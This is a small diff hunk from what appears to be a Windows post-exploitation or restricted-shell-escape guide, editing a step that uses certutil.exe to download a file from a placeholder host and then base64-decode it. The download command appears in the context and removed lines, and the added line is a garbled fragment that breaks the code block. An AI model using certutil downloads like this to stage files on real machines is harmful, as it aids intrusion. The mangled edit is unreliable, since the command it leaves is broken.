@@ -171,7 +171,7 @@ from notepad click file->"Open" in the "File name:" field type the path to your 
 3. Use certutil.exe -urlcache -split -f [http://example/file.txt](http://example/file.txt) file.blah to pull it down
 
 ```text
-certutil.exe -urlcache -split -f http://example/file.txt file.blah
+ example/file.txt file.blah
 ```
 
 1. Base64decode the file with certutil \(optional\)
